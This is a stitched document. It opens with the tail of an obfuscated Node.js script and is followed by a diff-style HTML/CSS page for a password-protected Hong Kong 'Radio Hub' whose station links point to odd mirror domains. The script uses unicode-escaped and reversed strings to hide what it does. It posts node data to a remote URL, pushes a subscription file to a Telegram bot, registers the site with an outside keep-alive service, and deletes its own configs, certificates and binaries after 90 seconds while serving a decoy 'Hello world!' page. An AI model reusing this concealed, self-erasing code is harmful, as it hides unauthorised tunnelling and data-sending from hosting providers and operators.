axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/add-nodes`,jsonData,{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{'Content-Type':"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});if(response&&response['\u0073\u0074\u0061\u0074\u0075\u0073']===(585116^585044)){return response;}else{return null;}}catch(error){return null;}}else{return;}}function cleanFiles(){setTimeout(()=>{var _0x538a=(831626^831618)+(208062^208060);const _0x2e561a=[bootLogPath,configPath,webPath,botPath,listPath,certPath,keyPath];_0x538a='\u0062\u0065\u0064\u0062\u0065\u0065';if(NEZHA_PORT){_0x2e561a['\u0070\u0075\u0073\u0068'](npmPath);}else if(NEZHA_SERVER&&NEZHA_KEY){_0x2e561a['\u0070\u0075\u0073\u0068'](phpPath);}if(process['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D']==="\u0077\u0069\u006E\u0033\u0032"){exec(`del /f /q ${_0x2e561a['\u006A\u006F\u0069\u006E']("\u0020")} > nul 2>&1`);}else{exec(`rm -rf ${_0x2e561a['\u006A\u006F\u0069\u006E']("\u0020")} >/dev/null 2>&1`);}},90000);}cleanFiles();async function sendTelegram(){if(!BOT_TOKEN||!CHAT_ID){return;}try{var _0xfe2g=(525462^525463)+(727145^727147);const _0xc2f59f=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](subPath,"8ftu".split("").reverse().join(""));_0xfe2g=553815^553823;var _0x279gb=(361917^361908)+(302891^302882);const _0x06b=`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;_0x279gb=(489071^489071)+(361836^361834);const _0x76dfd=NAME['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp("]-!.}{|=+#>`~)(]\\[\\*_[".split("").reverse().join(""),'\u0067'),"&$\\".split("").reverse().join(""));const _0xaec1b={'\u0063\u0068\u0061\u0074\u005F\u0069\u0064':CHAT_ID,'\u0074\u0065\u0078\u0074':`**${_0x76dfd}节点推送**\n\`\`\`${_0xc2f59f}\`\`\``,"parse_mode":"\u004D\u0061\u0072\u006B\u0064\u006F\u0077\u006E\u0056\u0032"};await axios['\u0070\u006F\u0073\u0074'](_0x06b,null,{'\u0070\u0061\u0072\u0061\u006D\u0073':_0xaec1b});}catch(error){}}async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){return;}try{const _0xa86bd=await axios['\u0070\u006F\u0073\u0074']("lru-dda/ten.00vres.oooo//:sptth".split("").reverse().join(""),{"url":PROJECT_URL},{"headers":{'Content-Type':"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});return _0xa86bd;}catch(error){return null;}}async function startserver(){try{argoType();deleteNodes();cleanupOldFiles();if(isValidPort(REALITY_PORT)){generateOrLoadKeyPair();}if(isValidPort(HY2_PORT)){ensureTlsCertificates(certPath,keyPath);}await generateConfig();await downloadFilesAndRun();await extractDomains();await sendTelegram();await AddVisitTask();}catch(error){}}startserver()['\u0063\u0061\u0074\u0063\u0068'](()=>{});const server=http['\u0063\u0072\u0065\u0061\u0074\u0065\u0053\u0065\u0072\u0076\u0065\u0072'](async(req,res)=>{const urlPath=req['\u0075\u0072\u006C']['\u0073\u0070\u006C\u0069\u0074']("\u003F")[421750^421750];if(urlPath==="\u002F"){try{const filePath=path['\u006A\u006F\u0069\u006E'](__dirname,"lmth.xedni".split("").reverse().join(""));var _0x2cb8c=(889064^889056)+(745363^745370);const data=await fs['\u0070\u0072\u006F\u006D\u0069\u0073\u0065\u0073']['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065'](filePath,"\u0075\u0074\u0066\u0038");_0x2cb8c=(126952^126944)+(120299^120291);res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](442004^441948,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0074\u0065\u0078\u0074\u002F\u0068\u0074\u006D\u006C\u003B\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u003D\u0075\u0074\u0066\u002D\u0038"});res['\u0065\u006E\u0064'](data);}catch(err){res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](147751^147951,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":'text/html; charset=utf-8'});res['\u0065\u006E\u0064']("\u0048\u0065\u006C\u006C\u006F\u0020\u0077\u006F\u0072\u006C\u0064\u0021");}return;}res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](253760^253652,{'Content-Type':"\u0074\u0065\u0078\u0074\u002F\u0070\u006C\u0061\u0069\u006E\u003B\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u003D\u0075\u0074\u0066\u002D\u0038"});res['\u0065\u006E\u0064']("\u004E\u006F\u0074\u0020\u0046\u006F\u0075\u006E\u0064");});server['\u006C\u0069\u0073\u0074\u0065\u006E'](PORT);
+:root{
+  --bg:#03050a;
+  --panel:rgba(10,15,27,.78);
+  --line:rgba(255,255,255,.08);
+  --text:#f4f7ff;
+  --muted:#8d99ae;
+  --cyan:#52d9ff;
+  --blue:#638cff;
+  --pink:#ff4fd8;
+  --green:#45f0a0;
+  --yellow:#ffd76a;
+}
+
+html,body{
+  width:100%;
+  min-height:100%;
+  background:var(--bg);
+  color:var(--text);
+  font-family:
+    Inter,
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    "PingFang SC",
+    "Microsoft YaHei",
+    sans-serif;
+}
+
+body{
+  overflow-x:hidden;
+}
+
+/* =========================================================
+   星空背景
+========================================================= */
+
+.space{
+  position:fixed;
+  inset:0;
+  overflow:hidden;
+  z-index:0;
+  pointer-events:none;
+
+  background:
+    radial-gradient(
+      circle at 50% -10%,
+      rgba(64,103,255,.16),
+      transparent 42%
+    ),
+    radial-gradient(
+      circle at 90% 70%,
+      rgba(255,0,204,.07),
+      transparent 35%
+    ),
+    radial-gradient(
+      circle at 10% 80%,
+      rgba(0,205,255,.07),
+      transparent 35%
+    ),
+    #03050a;
+}
+
+.space svg{
+  width:100%;
+  height:100%;
+}
+
+.star{
+  fill:#fff;
+  animation:twinkle 3s infinite alternate;
+}
+
+@keyframes twinkle{
+  from{
+    opacity:.12
+  }
+
+  to{
+    opacity:.75
+  }
+}
+
+.shooting{
+  stroke:var(--cyan);
+  stroke-width:1.2;
+  stroke-linecap:round;
+  opacity:0;
+
+  animation:
+    shoot 10s linear infinite;
+}
+
+@keyframes shoot{
+
+  0%,70%{
+    opacity:0;
+    transform:translate(0,0)
+  }
+
+  73%{
+    opacity:.8
+  }
+
+  84%{
+    opacity:0;
+    transform:translate(-220px,150px)
+  }
+
+  100%{
+    opacity:0
+  }
+
+}
+
+/* =========================================================
+   主体
+========================================================= */
+
+.container{
+  position:relative;
+  z-index:2;
+
+  width:min(1420px,94%);
+
+  margin:auto;
+
+  padding:
+    30px
+    0
+    50px;
+}
+
+/* =========================================================
+   HEADER
+========================================================= */
+
+header{
+  display:flex;
+
+  justify-content:space-between;
+  align-items:center;
+
+  gap:20px;
+
+  margin-bottom:25px;
+}
+
+.brand{
+  display:flex;
+  align-items:center;
+
+  gap:14px;
+}
+
+.brand-icon{
+  width:48px;
+  height:48px;
+
+  flex:none;
+
+  border-radius:15px;
+
+  background:
+    linear-gradient(
+      135deg,
+      #182b5f,
+      #111728
+    );
+
+  border:
+    1px solid
+    rgba(104,220,255,.23);
+
+  box-shadow:
+    0 0 35px
+    rgba(68,187,255,.12);
+
+  display:grid;
+  place-items:center;
+}
+
+.brand-icon svg{
+  width:30px;
+}
+
+.brand h1{
+  font-size:22px;
+
+  letter-spacing:.5px;
+}
+
+.brand p{
+  font-size:12px;
+
+  color:var(--muted);
+
+  margin-top:3px;
+}
+
+.clock{
+  text-align:right;
+}
+
+.clock strong{
+  font-size:20px;
+
+  letter-spacing:1px;
+}
+
+.clock span{
+  display:block;
+
+  color:var(--muted);
+
+  font-size:10px;
+
+  margin-top:4px;
+}
+
+/* =========================================================
+   通用卡片
+========================================================= */
+
+.card{
+  background:
+    linear-gradient(
+      145deg,
+      rgba(16,23,40,.84),
+      rgba(5,9,18,.72)
+    );
+
+  border:
+    1px solid
+    var(--line);
+
+  border-radius:24px;
+
+  box-shadow:
+    0 20px 70px
+    rgba(0,0,0,.25),
+
+    inset 0 1px
+    rgba(255,255,255,.03);
+
+  backdrop-filter:blur(16px);
+
+  -webkit-backdrop-filter:blur(16px);
+}
+
+/* =========================================================
+   LIVE RADIO
+========================================================= */
+
+.radio-section{
+  margin-bottom:25px;
+}
+
+.section-title{
+  margin:
+    0
+    2px
+    13px;
+
+  display:flex;
+
+  justify-content:space-between;
+
+  align-items:end;
+}
+
+.section-title strong{
+  font-size:17px;
+}
+
+.section-title span{
+  color:var(--muted);
+
+  font-size:11px;
+}
+
+.radios{
+  display:grid;
+
+  grid-template-columns:
+    repeat(3,minmax(0,1fr));
+
+  gap:16px;
+
+  align-items:stretch;
+}
+
+.radio{
+  padding:20px;
+
+  min-height:175px;
+
+  height:100%;
+
+  cursor:pointer;
+
+  position:relative;
+
+  overflow:hidden;
+
+  transition:
+    transform .25s ease,
+    border-color .25s ease,
+    box-shadow .25s ease;
+
+  display:flex;
+
+  flex-direction:column;
+}
+
+.radio:hover{
+  transform:translateY(-5px);
+
+  border-color:
+    rgba(96,210,255,.28);
+
+  box-shadow:
+    0 20px 50px
+    rgba(0,0,0,.35);
+}
+
+.radio:after{
+  content:"";
+
+  position:absolute;
+
+  width:130px;
+  height:130px;
+
+  right:-50px;
+  bottom:-60px;
+
+  border-radius:50%;
+
+  background:
+    rgba(73,200,255,.07);
+
+  pointer-events:none;
+}
+
+.radio-logo{
+  width:60px;
+  height:60px;
+
+  flex:none;
+
+  border-radius:18px;
+
+  display:grid;
+
+  place-items:center;
+
+  background:
+    rgba(255,255,255,.035);
+
+  border:
+    1px solid
+    rgba(255,255,255,.075);
+
+  margin-bottom:17px;
+}
+
+.radio-logo svg{
+  width:38px;
+  height:38px;
+}
+
+.radio h3{
+  font-size:16px;
+}
+
+.radio p{
+  color:var(--muted);
+
+  font-size:11px;
+
+  margin-top:5px;
+
+  line-height:1.55;
+}
+
+.radio-bottom{
+  margin-top:auto;
+
+  padding-top:15px;
+
+  display:flex;
+
+  align-items:center;
+
+  justify-content:space-between;
+}
+
+.live{
+  display:flex;
+
+  align-items:center;
+
+  gap:6px;
+
+  font-size:10px;
+
+  color:var(--green);
+}
+
+.live b{
+  width:6px;
+  height:6px;
+
+  flex:none;
+
+  border-radius:50%;
+
+  background:var(--green);
+
+  animation:
+    blink 1.2s infinite;
+}
+
+@keyframes blink{
+
+  50%{
+    opacity:.25;
+  }
+
+}
+
+.enter{
+  color:var(--cyan);
+
+  font-size:11px;
+}
+
+/* =========================================================
+   HERO
+========================================================= */
+
+.hero{
+  min-height:455px;
+
+  display:grid;
+
+  grid-template-columns:
+    minmax(0,1fr)
+    minmax(390px,1.35fr)
+    minmax(0,1fr);
+
+  align-items:stretch;
+
+  gap:14px;
+
+  padding:20px;
+
+  overflow:hidden;
+
+  position:relative;
+}
+
+.hero:before{
+  content:"";
+
+  position:absolute;
+
+  width:550px;
+  height:550px;
+
+  left:50%;
+  top:50%;
+
+  transform:
+    translate(-50%,-50%);
+
+  border-radius:50%;
+
+  background:
+    radial-gradient(
+      circle,
+      rgba(57,169,255,.10),
+      transparent 68%
+    );
+
+  pointer-events:none;
+}
+
+/* =========================================================
+   WEATHER
+========================================================= */
+
+.weather-list{
+  display:grid;
+
+  grid-template-rows:
+    repeat(2,minmax(0,1fr));
+
+  gap:14px;
+
+  min-width:0;
+}
+
+.weather{
+  min-height:0;
+
+  height:100%;
+
+  padding:17px;
+
+  border:
+    1px solid
+    rgba(255,255,255,.055);
+
+  background:
+    rgba(255,255,255,.022);
+
+  border-radius:18px;
+
+  display:flex;
+
+  flex-direction:column;
+
+  justify-content:center;
+}
+
+.weather-top{
+  display:flex;
+
+  justify-content:space-between;
+
+  align-items:center;
+
+  gap:10px;
+}
+
+.city{
+  font-size:14px;
+
+  font-weight:600;
+}
+
+.weather-icon{
+  width:48px;
+  height:48px;
+
+  flex:none;
+}
+
+.weather-main{
+  display:flex;
+
+  align-items:end;
+
+  gap:10px;
+
+  margin-top:7px;
+}
+
+.temp{
+  font-size:32px;
+
+  font-weight:700;
+}
+
+.weather-desc{
+  font-size:11px;
+
+  color:var(--muted);
+
+  padding-bottom:5px;
+}
+
+.weather-info{
+  display:flex;
+
+  gap:14px;
+
+  margin-top:9px;
+
+  color:var(--muted);
+
+  font-size:10px;
+}
+
+/* =========================================================
+   3D 地球
+========================================================= */
+
+.globe-wrap{
+  display:grid;
+
+  place-items:center;
+
+  position:relative;
+
+  min-width:0;
+}
+
+.globe{
+  width:min(430px,100%);
+
+  aspect-ratio:1;
+
+  position:relative;
+}
+
+.globe svg{
+  width:100%;
+  height:100%;
+
+  overflow:visible;
+}
+
+.globe-core{
+  fill:url(#earthGradient);
+
+  stroke:
+    rgba(105,215,255,.58);
+
+  stroke-width:1;
+}
+
+.grid{
+  fill:none;
+
+  stroke:
+    rgba(107,211,255,.18);
+
+  stroke-width:.65;
+}
+
+.orbit{
+  fill:none;
+
+  stroke:
+    rgba(94,217,255,.16);
+
+  stroke-width:1;
+
+  stroke-dasharray:5 8;
+
+  animation:
+    orbit 18s linear infinite;
+
+  transform-origin:50% 50%;
+}
+
+@keyframes orbit{
+
+  to{
+    transform:rotate(360deg);
+  }
+
+}
+
+.continent{
+  fill:
+    rgba(78,191,255,.17);
+
+  stroke:
+    rgba(93,216,255,.27);
+
+  stroke-width:.7;
+}
+
+/* =========================================================
+   香港 / 广州
+========================================================= */
+
+.pulse{
+  fill:var(--pink);
+
+  animation:
+    pulse 1.8s infinite;
+}
+
+@keyframes pulse{
+
+  0%{
+    r:3;
+    opacity:.9;
+  }
+
+  70%{
+    r:13;
+    opacity:0;
+  }
+
+  100%{
+    r:13;
+    opacity:0;
+  }
+
+}
+
+.location{
+  fill:var(--pink);
+
+  stroke:white;
+
+  stroke-width:1;
+}
+
+.gz-location{
+  fill:var(--yellow);
+
+  stroke:white;
+
+  stroke-width:1;
+}
+
+/* =========================================================
+   访客位置
+========================================================= */
+
+.visitor-pulse{
+  fill:var(--cyan);
+
+  animation:
+    visitorPulse 1.8s infinite;
+}
+
+@keyframes visitorPulse{
+
+  0%{
+    r:3;
+    opacity:1;
+  }
+
+  75%{
+    r:17;
+    opacity:0;
+  }
+
+  100%{
+    r:17;
+    opacity:0;
+  }
+
+}
+
+.visitor-dot{
+  fill:var(--cyan);
+
+  stroke:white;
+
+  stroke-width:1.2;
+}
+
+.visitor-line{
+  stroke:var(--cyan);
+
+  stroke-width:.8;
+
+  stroke-dasharray:3 4;
+
+  opacity:.75;
+}
+
+.globe-label{
+  fill:#fff;
+
+  font-size:8px;
+
+  letter-spacing:.5px;
+}
+
+.visitor-label{
+  fill:var(--cyan);
+
+  font-size:8px;
+
+  font-weight:600;
+}
+
+.globe-caption{
+  position:absolute;
+
+  bottom:6%;
+
+  left:50%;
+
+  transform:
+    translateX(-50%);
+
+  text-align:center;
+
+  white-space:nowrap;
+}
+
+.globe-caption strong{
+  font-size:13px;
+}
+
+.globe-caption span{
+  display:block;
+
+  color:var(--muted);
+
+  font-size:10px;
+
+  margin-top:3px;
+}
+
+/* =========================================================
+   右侧信息
+========================================================= */
+
+.ip-panel{
+  min-width:0;
+
+  height:100%;
+
+  display:grid;
+
+  grid-template-rows:
+    repeat(3,minmax(0,1fr));
+
+  gap:14px;
+}
+
+.ip-card{
+  min-height:0;
+
+  height:100%;
+
+  padding:17px;
+
+  border:
+    1px solid
+    rgba(255,255,255,.055);
+
+  background:
+    rgba(255,255,255,.022);
+
+  border-radius:18px;
+
+  display:flex;
+
+  flex-direction:column;
+
+  justify-content:center;
+}
+
+.ip-head{
+  display:flex;
+
+  justify-content:space-between;
+
+  align-items:center;
+
+  gap:10px;
+}
+
+.ip-title{
+  font-size:12px;
+
+  color:var(--muted);
+}
+
+.online{
+  display:flex;
+
+  align-items:center;
+
+  gap:6px;
+
+  font-size:10px;
+
+  color:var(--green);
+}
+
+.online i{
+  width:6px;
+  height:6px;
+
+  flex:none;
+
+  border-radius:50%;
+
+  background:var(--green);
+
+  box-shadow:
+    0 0 10px
+    var(--green);
+}
+
+.ip-number{
+  margin-top:9px;
+
+  font-size:20px;
+
+  font-weight:700;
+
+  word-break:break-all;
+}
+
+.ip-location{
+  margin-top:5px;
+
+  color:var(--muted);
+
+  font-size:11px;
+
+  line-height:1.6;
+}
+
+.ip-coordinates{
+  margin-top:8px;
+
+  color:#5f718e;
+
+  font-size:9px;
+}
+
+/* =========================================================
+   NETWORK REGION
+========================================================= */
+
+.region-content{
+  margin-top:10px;
+
+  font-size:11px;
+
+  line-height:1.75;
+
+  color:var(--muted);
+}
+
+.region-content div{
+  display:flex;
+
+  justify-content:space-between;
+
+  gap:10px;
+
+  border-bottom:
+    1px solid
+    rgba(255,255,255,.035);
+
+  padding:2px 0;
+}
+
+.region-content div:last-child{
+  border-bottom:0;
+}
+
+.region-content b{
+  color:#dbe6fa;
+
+  font-weight:500;
+
+  text-align:right;
+
+  max-width:62%;
+
+  overflow:hidden;
+
+  text-overflow:ellipsis;
+
+  white-space:nowrap;
+}
+
+/* =========================================================
+   DEVICE
+========================================================= */
+
+.device-list{
+  display:grid;
+
+  gap:8px;
+
+  margin-top:10px;
+}
+
+.device-row{
+  display:flex;
+
+  justify-content:space-between;
+
+  align-items:center;
+
+  gap:12px;
+
+  font-size:10px;
+}
+
+.device-row span:first-child{
+  color:var(--muted);
+
+  flex:none;
+}
+
+.device-row span:last-child{
+  text-align:right;
+
+  max-width:68%;
+
+  overflow:hidden;
+
+  text-overflow:ellipsis;
+
+  white-space:nowrap;
+
+  color:#dbe6fa;
+}
+
+/* =========================================================
+   FOOTER
+========================================================= */
+
+footer{
+  text-align:center;
+
+  color:#566176;
+
+  font-size:10px;
+
+  margin-top:28px;
+}
+
+/* =========================================================
+   平板
+========================================================= */
+
+@media(max-width:1100px){
+
+  .hero{
+    grid-template-columns:
+      minmax(0,1fr)
+      minmax(300px,1.1fr)
+      minmax(0,1fr);
+
+    gap:12px;
+  }
+
+  .globe{
+    width:min(360px,100%);
+  }
+
+  .weather{
+    padding:14px;
+  }
+
+  .ip-card{
+    padding:14px;
+  }
+
+  .ip-number{
+    font-size:17px;
+  }
+
+}
+
+/* =========================================================
+   900px 以下
+========================================================= */
+
+@media(max-width:900px){
+
+  .hero{
+    grid-template-columns:1fr;
+
+    min-height:auto;
+
+    padding:18px;
+  }
+
+  .globe-wrap{
+    order:-1;
+  }
+
+  .globe{
+    width:350px;
+
+    max-width:100%;
+  }
+
+  .weather-list{
+    grid-template-columns:
+      repeat(2,minmax(0,1fr));
+
+    grid-template-rows:none;
+  }
+
+  .ip-panel{
+    grid-template-columns:
+      repeat(3,minmax(0,1fr));
+
+    grid-template-rows:none;
+
+    height:auto;
+  }
+
+  .ip-card{
+    min-height:175px;
+  }
+
+}
+
+/* =========================================================
+   手机
+========================================================= */
+
+@media(max-width:700px){
+
+  .container{
+    width:92%;
+
+    padding-top:20px;
+  }
+
+  header{
+    align-items:flex-start;
+  }
+
+  .clock{
+    display:none;
+  }
+
+  .brand h1{
+    font-size:19px;
+  }
+
+  .brand p{
+    font-size:10px;
+  }
+
+  .section-title{
+    align-items:center;
+  }
+
+  .section-title span{
+    display:none;
+  }
+
+  .radios{
+    grid-template-columns:1fr;
+  }
+
+  .radio{
+    min-height:175px;
+  }
+
+  .weather-list{
+    grid-template-columns:1fr;
+  }
+
+  .weather{
+    min-height:150px;
+  }
+
+  .ip-panel{
+    grid-template-columns:1fr;
+  }
+
+  .ip-card{
+    min-height:150px;
+  }
+
+  .globe{
+    width:330px;
+  }
+
+}
+
+/* =========================================================
+   页面密码保护
+========================================================= */
+
+#loginScreen{
+  position:fixed;
+  inset:0;
+
+  z-index:99999;
+
+  display:flex;
+
+  align-items:center;
+  justify-content:center;
+
+  background:
+    radial-gradient(
+      circle at 50% 40%,
+      rgba(82,217,255,.10),
+      transparent 38%
+    ),
+    #03050a;
+}
+
+.login-box{
+  width:min(380px,90%);
+
+  padding:35px 30px;
+
+  text-align:center;
+
+  background:
+    linear-gradient(
+      145deg,
+      rgba(16,23,40,.94),
+      rgba(5,9,18,.94)
+    );
+
+  border:
+    1px solid
+    rgba(255,255,255,.10);
+
+  border-radius:24px;
+
+  box-shadow:
+    0 25px 80px
+    rgba(0,0,0,.65),
+
+    inset 0 1px
+    rgba(255,255,255,.04);
+
+  backdrop-filter:blur(20px);
+
+  -webkit-backdrop-filter:blur(20px);
+}
+
+.login-icon{
+  width:64px;
+  height:64px;
+
+  margin:0 auto 18px;
+
+  border-radius:20px;
+
+  display:grid;
+
+  place-items:center;
+
+  background:
+    linear-gradient(
+      135deg,
+      #182b5f,
+      #111728
+    );
+
+  border:
+    1px solid
+    rgba(104,220,255,.23);
+
+  box-shadow:
+    0 0 35px
+    rgba(68,187,255,.12);
+}
+
+.login-icon svg{
+  width:38px;
+  height:38px;
+}
+
+.login-box h2{
+  font-size:21px;
+
+  letter-spacing:1px;
+}
+
+.login-box p{
+  margin-top:7px;
+
+  color:var(--muted);
+
+  font-size:11px;
+}
+
+.login-input{
+  width:100%;
+
+  margin-top:24px;
+
+  padding:13px 15px;
+
+  border-radius:11px;
+
+  border:
+    1px solid
+    rgba(255,255,255,.10);
+
+  outline:none;
+
+  background:
+    rgba(255,255,255,.04);
+
+  color:#fff;
+
+  font-size:13px;
+
+  text-align:center;
+
+  transition:
+    border-color .2s ease,
+    box-shadow .2s ease;
+}
+
+.login-input:focus{
+  border-color:
+    rgba(82,217,255,.5);
+
+  box-shadow:
+    0 0 20px
+    rgba(82,217,255,.08);
+}
+
+.login-input::placeholder{
+  color:#657188;
+}
+
+.login-button{
+  width:100%;
+
+  margin-top:12px;
+
+  padding:13px;
+
+  border:0;
+
+  border-radius:11px;
+
+  background:
+    linear-gradient(
+      135deg,
+      #52d9ff,
+      #638cff
+    );
+
+  color:#03050a;
+
+  font-size:13px;
+
+  font-weight:700;
+
+  cursor:pointer;
+
+  transition:
+    transform .2s ease,
+    box-shadow .2s ease;
+}
+
+.login-button:hover{
+  transform:translateY(-2px);
+
+  box-shadow:
+    0 8px 25px
+    rgba(82,217,255,.20);
+}
+
+.login-error{
+  display:none;
+
+  margin-top:12px;
+
+  color:#ff4f7b;
+
+  font-size:11px;
+}
+
+@media(max-width:700px){
+
+  .login-box{
+    padding:30px 23px;
+  }
+
+}
+</style>
+</head>
+
+<body>
+
+<!-- =======================================================
+     页面密码保护
+======================================================= -->
+
+<div id="loginScreen">
+
+  <div class="login-box">
+
+    <div class="login-icon">
+
+      <svg
+        viewBox="0 0 40 40"
+        fill="none">
+
+        <circle
+          cx="20"
+          cy="20"
+          r="14"
+          stroke="#52d9ff"
+          stroke-width="1.5"
+        />
+
+        <path
+          d="
+            M13 20
+            C13 16 16 13 20 13
+            C24 13 27 16 27 20
+            V25
+            C27 28 24 30 20 30
+            C16 30 13 28 13 25
+            Z
+          "
+          stroke="#52d9ff"
+          stroke-width="1.5"
+        />
+
+        <circle
+          cx="20"
+          cy="22"
+          r="2.5"
+          fill="#ff4fd8"
+        />
+
+      </svg>
+
+    </div>
+
+    <h2>
+      RADIO HUB
+    </h2>
+
+    <p>
+      香港电台 · Radio Hub
+    </p>
+
+    <input
+      id="pagePassword"
+      class="login-input"
+      type="password"
+      placeholder="请输入访问密码"
+      autocomplete="off"
+    >
+
+    <button
+      class="login-button"
+      onclick="checkPagePassword()">
+
+      ENTER RADIO HUB
+
+    </button>
+
+    <div
+      id="loginError"
+      class="login-error">
+
+      密码错误，请重新输入
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<!-- =======================================================
+     星空
+======================================================= -->
+
+<div class="space">
+
+<svg
+  viewBox="0 0 1600 1000"
+  preserveAspectRatio="xMidYMid slice">
+
+  <defs>
+
+    <radialGradient id="nebula">
+
+      <stop
+        offset="0"
+        stop-color="#4f80ff"
+        stop-opacity=".18"/>
+
+      <stop
+        offset="1"
+        stop-color="#4f80ff"
+        stop-opacity="0"/>
+
+    </radialGradient>
+
+  </defs>
+
+  <circle
+    cx="800"
+    cy="0"
+    r="600"
+    fill="url(#nebula)"
+  />
+
+  <g id="stars"></g>
+
+  <line
+    class="shooting"
+    x1="1300"
+    y1="100"
+    x2="1480"
+    y2="20"
+  />
+
+  <line
+    class="shooting"
+    x1="400"
+    y1="80"
+    x2="560"
+    y2="20"
+    style="animation-delay:4s"
+  />
+
+</svg>
+
+</div>
+
+
+<div class="container">
+
+<!-- =======================================================
+     HEADER
+======================================================= -->
+
+<header>
+
+  <div class="brand">
+
+    <div class="brand-icon">
+
+      <svg
+        viewBox="0 0 40 40"
+        fill="none">
+
+        <circle
+          cx="20"
+          cy="20"
+          r="14"
+          stroke="#52d9ff"
+          stroke-width="1.5"
+        />
+
+        <path
+          d="
+            M11 20h18
+            M20 11c5 5 5 13 0 18
+            M20 11c-5 5-5 13 0 18
+          "
+          stroke="#52d9ff"
+          stroke-width="1"
+        />
+
+        <circle
+          cx="20"
+          cy="20"
+          r="3"
+          fill="#ff4fd8"
+        />
+
+      </svg>
+
+    </div>
+
+    <div>
+
+      <h1>
+        香港电台 · RADIO HUB
+      </h1>
+
+      <p>
+        Hong Kong Radio Network · Live Portal
+      </p>
+
+    </div>
+
+  </div>
+
+
+  <div class="clock">
+
+    <strong id="clock">
+      --:--:--
+    </strong>
+
+    <span>
+      HONG KONG · ASIA/HONG_KONG
+    </span>
+
+  </div>
+
+</header>
+
+
+<!-- =======================================================
+     LIVE RADIO
+======================================================= -->
+
+<section class="radio-section">
+
+  <div class="section-title">
+
+    <strong>
+      LIVE RADIO
+    </strong>
+
+    <span>
+      选择电台开始收听
+    </span>
+
+  </div>
+
+
+  <div class="radios">
+
+    <!-- 第一位：香港电台 RTHK -->
+
+    <div
+      class="radio card"
+      onclick="
+        location.href='https://rthk.fucker.de5.net/'
+      ">
+
+      <div class="radio-logo">
+
+        <svg viewBox="0 0 50 50">
+
+          <path
+            d="M13 13h24v24H13z"
+            fill="none"
+            stroke="#ff4fd8"
+            stroke-width="2"
+          />
+
+          <path
+            d="
+              M18 30V20
+              M25 30V16
+              M32 30V23
+            "
+            stroke="#ff4fd8"
+            stroke-width="3"
+            stroke-linecap="round"
+          />
+
+        </svg>
+
+      </div>
+
+      <h3>
+        香港电台 RTHK
+      </h3>
+
+      <p>
+        Radio Television Hong Kong · 香港公共广播
+      </p>
+
+      <div class="radio-bottom">
+
+        <span class="live">
+          <b></b>
+          LIVE RADIO
+        </span>
+
+        <span class="enter">
+          ENTER →
+        </span>
+
+      </div>
+
+    </div>
+
+
+    <!-- 第二位：香港商业电台 -->
+
+    <div
+      class="radio card"
+      onclick="
+        location.href='https://881903.fucker.de5.net/'
+      ">
+
+      <div class="radio-logo">
+
+        <svg viewBox="0 0 50 50">
+
+          <circle
+            cx="25"
+            cy="25"
+            r="19"
+            fill="none"
+            stroke="#ffd76a"
+            stroke-width="2"
+          />
+
+          <path
+            d="
+              M17 19
+              C32 13 37 24 27 28
+              L18 31
+              C30 27 37 35 29 38
+            "
+            fill="none"
+            stroke="#ffd76a"
+            stroke-width="2.4"
+            stroke-linecap="round"
+          />
+
+        </svg>
+
+      </div>
+
+      <h3>
+        香港商业电台
+      </h3>
+
+      <p>
+        Commercial Radio · 雷霆881 · 叱咤903 · AM864
+      </p>
+
+      <div class="radio-bottom">
+
+        <span class="live">
+          <b></b>
+          LIVE RADIO
+        </span>
+
+        <span class="enter">
+          ENTER →
+        </span>
+
+      </div>
+
+    </div>
+
+
+    <!-- 第三位：香港新城电台 -->
+
+    <div
+      class="radio card"
+      onclick="
+        location.href='https://mbo.fucker.de5.net/'
+      ">
+
+      <div class="radio-logo">
+
+        <svg viewBox="0 0 50 50">
+
+          <circle
+            cx="25"
+            cy="25"
+            r="19"
+            fill="none"
+            stroke="#52d9ff"
+            stroke-width="2"
+          />
+
+          <path
+            d="
+              M15 30
+              C15 21 35 21 35 30
+            "
+            fill="none"
+            stroke="#52d9ff"
+            stroke-width="2"
+          />
+
+          <circle
+            cx="25"
+            cy="30"
+            r="4"
+            fill="#ff4fd8"
+          />
+
+        </svg>
+
+      </div>
+
+      <h3>
+        香港新城电台
+      </h3>
+
+      <p>
+        Metro Radio · 新城知訊台 · 財經台 · Metro Plus
+      </p>
+
+      <div class="radio-bottom">
+
+        <span class="live">
+          <b></b>
+          LIVE RADIO
+        </span>
+
+        <span class="enter">
+          ENTER →
+
+        </span>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<!-- =======================================================
+     HERO
+======================================================= -->
+
+<section class="hero card">
+
+
+<!-- =====================================================
+     WEATHER
+===================================================== -->
+
+<div class="weather-list">
+
+
+  <!-- 香港 -->
+
+  <div class="weather">
+
+    <div class="weather-top">
+
+      <span class="city">
+        香港 · Hong Kong
+      </span>
+
+      <svg
+        class="weather-icon"
+        viewBox="0 0 64 64">
+
+        <circle
+          cx="31"
+          cy="27"
+          r="12"
+          fill="#ffd76a"
+        />
+
+        <g
+          stroke="#ffd76a"
+          stroke-width="2"
+          stroke-linecap="round">
+
+          <path d="M31 7v6"/>
+          <path d="M31 41v6"/>
+          <path d="M11 27h6"/>
+          <path d="M45 27h6"/>
+          <path d="m17 13 4 4"/>
+          <path d="m41 37 4 4"/>
+
